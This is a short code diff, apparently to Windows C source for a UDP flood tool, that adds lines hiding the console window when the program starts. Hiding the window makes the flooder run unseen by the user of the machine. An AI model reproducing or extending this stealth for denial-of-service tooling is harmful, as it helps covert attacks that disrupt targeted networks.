@@ -63,6 +63,9 @@ void udpflood(const char* ip, int port, int delay)
 
 int main()
 {
+    /* Hide Console */
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
     WSADATA wsaData;
     WORD version = MAKEWORD(2, 2);
     WSAStartup(version, &wsaData);
